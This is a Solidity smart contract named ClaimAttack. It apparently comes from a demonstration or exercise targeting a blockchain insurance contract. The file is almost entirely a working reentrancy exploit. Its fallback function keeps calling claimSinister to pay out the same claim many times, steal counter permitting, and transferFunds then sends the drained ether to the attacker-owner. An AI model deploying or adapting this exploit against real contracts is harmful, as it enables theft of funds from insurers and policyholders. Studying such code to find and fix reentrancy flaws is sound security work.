// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface IInsurance {
    function addReceipt(string memory product_alias) external payable;
    function declareSinister(uint256 policy_id, string memory description, uint256 timestamp_seconds_sinisterDate, uint256 claim, string memory url, uint256 _sha256) external returns(uint256 sinister_id);
    function claimSinister(uint256 sinister_id) external;
}
// Sinister claim attack
contract ClaimAttack {

    address private owner;
    address private insurance;
    uint256 private sinister_id;
    uint256 private stealAmount;
    uint256 private test;

    constructor() {
        owner = msg.sender;
        sinister_id = 0;
        stealAmount = 0;
    }

    // Only owner of the contract can invoke the function that has this modifier
    modifier onlyOwner(){
        require(msg.sender == owner,"You are not the owner");
        _;
    }

    fallback() external payable {
        
        if (stealAmount > 1){
            stealAmount = stealAmount - 1;
            IInsurance(insurance).claimSinister(sinister_id);
        }
    }

    function setInsuranceAddr(address _insurance) public onlyOwner {
        insurance = _insurance;
    }

    function setSinisterId(uint256 _sinister_id) public onlyOwner {
        sinister_id = _sinister_id;
    }

    function addReceipt(string memory product_alias) public payable onlyOwner {
        IInsurance(insurance).addReceipt{ value: msg.value }(product_alias);
    }

    function declareSinister(uint256 policy_id, string memory description, uint256 timestamp_seconds_sinisterDate, uint256 claim, string memory url, uint256 _sha256) public onlyOwner {
        IInsurance(insurance).declareSinister(policy_id, description, timestamp_seconds_sinisterDate, claim, url, _sha256);
    }

    function claimSinister(uint256 _sinister_id) public onlyOwner {
        IInsurance(insurance).claimSinister(_sinister_id);
    }

    function transferFunds() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function setStealAmount(uint256 _amount) public onlyOwner {
        stealAmount = _amount;
    }


    
}